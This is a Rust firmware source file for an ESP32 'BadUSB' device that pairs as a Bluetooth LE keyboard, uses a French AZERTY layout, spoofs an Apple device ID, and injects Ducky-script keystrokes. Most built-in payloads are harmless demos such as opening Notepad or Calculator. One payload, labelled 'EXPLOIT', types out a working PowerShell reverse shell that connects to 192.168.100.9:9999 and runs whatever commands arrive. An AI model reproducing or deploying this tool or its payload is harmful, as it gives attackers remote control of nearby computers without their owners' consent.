//! BadUSB via clavier HID **Bluetooth LE** (`esp32-nimble`).
//! Layout clavier **AZERTY (FR)**.

use esp32_nimble::{
    enums::*, hid::*, utilities::mutex::Mutex, BLEAdvertisementData, BLECharacteristic, BLEDevice,
    BLEHIDDevice, BLEServer,
};
use esp_idf_svc::hal::gpio::{Input, PinDriver};
use log::info;
use std::sync::Arc;

const KEYBOARD_ID: u8 = 0x01;
const MEDIA_KEYS_ID: u8 = 0x02;

const HID_REPORT_DESCRIPTOR: &[u8] = hid!(
    (USAGE_PAGE, 0x01),
    (USAGE, 0x06),
    (COLLECTION, 0x01),
    (REPORT_ID, KEYBOARD_ID),
    (USAGE_PAGE, 0x07),
    (USAGE_MINIMUM, 0xE0),
    (USAGE_MAXIMUM, 0xE7),
    (LOGICAL_MINIMUM, 0x00),
    (LOGICAL_MAXIMUM, 0x01),
    (REPORT_SIZE, 0x01),
    (REPORT_COUNT, 0x08),
    (HIDINPUT, 0x02),
    (REPORT_COUNT, 0x01),
    (REPORT_SIZE, 0x08),
    (HIDINPUT, 0x01),
    (REPORT_COUNT, 0x05),
    (REPORT_SIZE, 0x01),
    (USAGE_PAGE, 0x08),
    (USAGE_MINIMUM, 0x01),
    (USAGE_MAXIMUM, 0x05),
    (HIDOUTPUT, 0x02),
    (REPORT_COUNT, 0x01),
    (REPORT_SIZE, 0x03),
    (HIDOUTPUT, 0x01),
    (REPORT_COUNT, 0x06),
    (REPORT_SIZE, 0x08),
    (LOGICAL_MINIMUM, 0x00),
    (LOGICAL_MAXIMUM, 0x65),
    (USAGE_PAGE, 0x07),
    (USAGE_MINIMUM, 0x00),
    (USAGE_MAXIMUM, 0x65),
    (HIDINPUT, 0x00),
    (END_COLLECTION),
);

const SHIFT: u8 = 0x80;
const ALTGR: u8 = 0x40;

const ASCII_MAP: &[u8] = &[
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x2a,
    0x2b,
    0x28,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x2c,
    0x38,
    0x20,
    0x20 | ALTGR,
    0x30,
    0x34 | SHIFT,
    0x1e,
    0x21,
    0x22,
    0x2d,
    0x31 | SHIFT,
    0x2e | SHIFT,
    0x10,
    0x23,
    0x36 | SHIFT,
    0x37 | SHIFT,
    0x27 | SHIFT,
    0x1e | SHIFT,
    0x1f | SHIFT,
    0x20 | SHIFT,
    0x21 | SHIFT,
    0x22 | SHIFT,
    0x23 | SHIFT,
    0x24 | SHIFT,
    0x25 | SHIFT,
    0x26 | SHIFT,
    0x37, // ':' AZERTY = touche US '.' (0x37) SANS shift (shift => '/')
    0x36,
    0x64,
    0x2e,
    0x64 | SHIFT,
    0x37 | SHIFT,
    0x27,
    0x14 | SHIFT,
    0x05 | SHIFT,
    0x06 | SHIFT,
    0x07 | SHIFT,
    0x08 | SHIFT,
    0x09 | SHIFT,
    0x0a | SHIFT,
    0x0b | SHIFT,
    0x0c | SHIFT,
    0x0d | SHIFT,
    0x0e | SHIFT,
    0x0f | SHIFT,
    0x33 | SHIFT,
    0x11 | SHIFT,
    0x12 | SHIFT,
    0x13 | SHIFT,
    0x04 | SHIFT,
    0x15 | SHIFT,
    0x16 | SHIFT,
    0x17 | SHIFT,
    0x18 | SHIFT,
    0x19 | SHIFT,
    0x1d | SHIFT,
    0x1b | SHIFT,
    0x1c | SHIFT,
    0x1a | SHIFT,
    0x22 | ALTGR,
    0x25 | ALTGR,
    0x2d | ALTGR,
    0x00,
    0x25 | SHIFT,
    0x00,
    0x14,
    0x05,
    0x06,
    0x07,
    0x08,
    0x09,
    0x0a,
    0x0b,
    0x0c,
    0x0d,
    0x0e,
    0x0f,
    0x33,
    0x11,
    0x12,
    0x13,
    0x04,
    0x15,
    0x16,
    0x17,
    0x18,
    0x19,
    0x1d,
    0x1b,
    0x1c,
    0x1a,
    0x21 | ALTGR,
    0x23 | ALTGR,
    0x2e | ALTGR,
    0x1f | ALTGR,
    0x00,
];

struct KeyReport {
    modifiers: u8,
    reserved: u8,
    keys: [u8; 6],
}
impl KeyReport {
    fn as_bytes(&self) -> [u8; 8] {
        [
            self.modifiers,
            self.reserved,
            self.keys[0],
            self.keys[1],
            self.keys[2],
            self.keys[3],
            self.keys[4],
            self.keys[5],
        ]
    }
}

pub struct Keyboard {
    server: &'static mut BLEServer,
    input_keyboard: Arc<Mutex<BLECharacteristic>>,
    #[allow(dead_code)]
    output_keyboard: Arc<Mutex<BLECharacteristic>>,
    #[allow(dead_code)]
    input_media_keys: Arc<Mutex<BLECharacteristic>>,
    key_report: KeyReport,
}

impl Keyboard {
    fn new() -> anyhow::Result<Self> {
        let device = BLEDevice::take();
        BLEDevice::init();
        device
            .security()
            .set_auth(AuthReq::all())
            .set_io_cap(SecurityIOCap::NoInputNoOutput)
            .resolve_rpa();
        let server = device.get_server();
        let mut hid = BLEHIDDevice::new(server);
        let input_keyboard = hid.input_report(KEYBOARD_ID);
        let output_keyboard = hid.output_report(KEYBOARD_ID);
        let input_media_keys = hid.input_report(MEDIA_KEYS_ID);
        hid.manufacturer("Axolotl");
        hid.pnp(0x02, 0x05ac, 0x820a, 0x0210);
        hid.hid_info(0x00, 0x01);
        hid.report_map(HID_REPORT_DESCRIPTOR);
        hid.set_battery_level(100);
        let ble_advertising = device.get_advertising();
        ble_advertising.lock().scan_response(false).set_data(
            BLEAdvertisementData::new()
                .name("Axolotl Keyboard")
                .appearance(0x03C1)
                .add_service_uuid(hid.hid_service().lock().uuid()),
        )?;
        ble_advertising.lock().start()?;
        Ok(Self {
            server,
            input_keyboard,
            output_keyboard,
            input_media_keys,
            key_report: KeyReport {
                modifiers: 0,
                reserved: 0,
                keys: [0; 6],
            },
        })
    }
    fn connected(&self) -> bool {
        self.server.connected_count() > 0
    }
    fn write(&mut self, text: &str) {
        use esp_idf_svc::hal::delay::FreeRtos;
        for (i, ch) in text.as_bytes().iter().enumerate() {
            if !self.connected() {
                return;
            }
            let c = *ch as usize;
            if c < ASCII_MAP.len() && ASCII_MAP[c] != 0 {
                self.press(*ch);
                self.release();
            }
            if i % 4 == 0 {
                FreeRtos::delay_ms(5);
            }
        }
    }
    fn press(&mut self, ch: u8) {
        let mut key = ASCII_MAP[ch as usize];
        self.key_report.modifiers = 0;
        if (key & SHIFT) > 0 {
            self.key_report.modifiers |= 0x02;
            key &= !SHIFT;
        }
        if (key & ALTGR) > 0 {
            self.key_report.modifiers |= 0x40;
            key &= !ALTGR;
        }
        self.key_report.keys[0] = key;
        self.send_report(&self.key_report);
    }
    fn press_combo(&mut self, modifier: u8, key: u8) {
        self.key_report.modifiers = modifier;
        self.key_report.keys[0] = key;
        self.send_report(&self.key_report);
        self.release();
    }
    fn release(&mut self) {
        self.key_report.modifiers = 0;
        self.key_report.keys.fill(0);
        self.send_report(&self.key_report);
    }
    fn send_report(&self, keys: &KeyReport) {
        self.input_keyboard
            .lock()
            .set_value(&keys.as_bytes())
            .notify();
        esp_idf_svc::hal::delay::Ets::delay_ms(12);
    }
    fn run_ducky(&mut self, script: &str, back: &PinDriver<'_, Input>) {
        use esp_idf_svc::hal::delay::FreeRtos;
        let mut dd = 0u32;
        for raw in script.lines() {
            if back.is_low() {
                info!("Interrompu");
                return;
            }
            let line = raw.trim();
            if line.is_empty() {
                continue;
            }
            let (cmd, arg) = match line.split_once(char::is_whitespace) {
                Some((c, a)) => (c, a.trim_start()),
                None => (line, ""),
            };
            match cmd.to_ascii_uppercase().as_str() {
                "REM" => {}
                "DELAY" => {
                    if let Ok(ms) = arg.trim().parse::<u32>() {
                        FreeRtos::delay_ms(ms);
                    }
                }
                "DEFAULTDELAY" | "DEFAULT_DELAY" => {
                    dd = arg.trim().parse::<u32>().unwrap_or(0);
                }
                "STRING" => self.write(arg),
                "STRINGLN" => {
                    self.write(arg);
                    self.press_combo(0, 0x28);
                }
                _ => self.exec_combo(line),
            }
            if dd > 0 {
                FreeRtos::delay_ms(dd);
            }
        }
    }
    fn exec_combo(&mut self, line: &str) {
        let mut mods = 0u8;
        let mut key = 0u8;
        for tok in line.split_whitespace() {
            if let Some(m) = modifier_for(tok) {
                mods |= m;
            } else if let Some(k) = keycode_for(tok) {
                key = k;
            } else if tok.len() == 1 {
                let c = tok.as_bytes()[0] as usize;
                if c < ASCII_MAP.len() {
                    key = ASCII_MAP[c] & !(SHIFT | ALTGR);
                }
            }
        }
        if mods != 0 || key != 0 {
            self.press_combo(mods, key);
        }
    }
}

fn modifier_for(tok: &str) -> Option<u8> {
    match tok.to_ascii_uppercase().as_str() {
        "GUI" | "WINDOWS" | "WIN" | "META" | "COMMAND" => Some(0x08),
        "CTRL" | "CONTROL" => Some(0x01),
        "SHIFT" => Some(0x02),
        "ALT" | "OPTION" => Some(0x04),
        _ => None,
    }
}
fn keycode_for(tok: &str) -> Option<u8> {
    let up = tok.to_ascii_uppercase();
    if let Some(n) = up.strip_prefix('F').and_then(|s| s.parse::<u8>().ok()) {
        if (1..=12).contains(&n) {
            return Some(0x3a + (n - 1));
        }
    }
    match up.as_str() {
        "ENTER" | "RETURN" => Some(0x28),
        "ESC" | "ESCAPE" => Some(0x29),
        "BACKSPACE" | "BACK" => Some(0x2a),
        "TAB" => Some(0x2b),
        "SPACE" => Some(0x2c),
        "CAPSLOCK" => Some(0x39),
        "INSERT" => Some(0x49),
        "HOME" => Some(0x4a),
        "PAGEUP" => Some(0x4b),
        "DELETE" | "DEL" => Some(0x4c),
        "END" => Some(0x4d),
        "PAGEDOWN" => Some(0x4e),
        "RIGHT" | "RIGHTARROW" => Some(0x4f),
        "LEFT" | "LEFTARROW" => Some(0x50),
        "DOWN" | "DOWNARROW" => Some(0x51),
        "UP" | "UPARROW" => Some(0x52),
        _ => None,
    }
}

pub fn make_keyboard() -> anyhow::Result<Keyboard> {
    Keyboard::new()
}

pub const BUILTIN_PAYLOADS: &[(&str, &str)] = &[
    ("Demo - Notepad", "DELAY 600\nGUI r\nDELAY 400\nSTRING notepad\nENTER\nDELAY 900\nSTRING Axolotl Zero - BadUSB Demo\nENTER\nSTRING Clavier BLE AZERTY\nENTER"),
    ("Demo - Calculatrice", "DELAY 600\nGUI r\nDELAY 400\nSTRING calc\nENTER\n"),
    ("Demo - Site ESGI", "DELAY 600\nWINDOWS r\nDELAY 800\nSTRING msedge https://www.esgi.fr\nENTER\n"),
    ("Demo - Verrouiller", "DELAY 400\nGUI l\n"),
    ("EXPLOIT", "DELAY 600\nGUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 1000\nSTRING $c=New-Object Net.Sockets.TCPClient('192.168.100.9',9999)\nENTER\nDELAY 300\nSTRING $s=$c.GetStream()\nENTER\nDELAY 200\nSTRING $w=New-Object IO.StreamWriter($s)\nENTER\nDELAY 200\nSTRING $w.AutoFlush=1\nENTER\nDELAY 200\nSTRING $w.WriteLine('AXOLOTL '+$env:COMPUTERNAME)\nENTER\nDELAY 200\nSTRING $b=New-Object byte[] 65536\nENTER\nDELAY 200\nSTRING while($c.Connected){$i=$s.Read($b,0,$b.Length);if($i -eq 0){break};$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$o=iex $d|Out-String;$sb=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($sb,0,$sb.Length);$s.Flush()}\nENTER\nDELAY 200\nSTRING $c.Close()\nENTER"),
];

pub const PAYLOADS_DIR: &str = "/sdcard/payloads";
pub fn list_payloads() -> Vec<String> {
    let Ok(rd) = std::fs::read_dir(PAYLOADS_DIR) else {
        return Vec::new();
    };
    let mut v: Vec<String> = rd
        .flatten()
        .filter(|e| {
            e.path()
                .extension()
                .map(|x| x.eq_ignore_ascii_case("txt"))
                .unwrap_or(false)
        })
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect();
    v.sort();
    v
}
pub fn payload_path(name: &str) -> String {
    format!("{PAYLOADS_DIR}/{name}")
}
pub fn run_payload(mut keyboard: Keyboard, script: &str, back: &PinDriver<'_, Input>) {
    use esp_idf_svc::hal::delay::FreeRtos;
    let mut done = false;
    loop {
        if back.is_low() {
            break;
        }
        if keyboard.connected() {
            if !done {
                info!("Execution...");
                keyboard.run_ducky(script, back);
                info!("Termine");
                done = true;
            }
        } else {
            done = false;
        }
        FreeRtos::delay_ms(500);
    }
    drop(keyboard);
    let _ = BLEDevice::deinit_full();
}
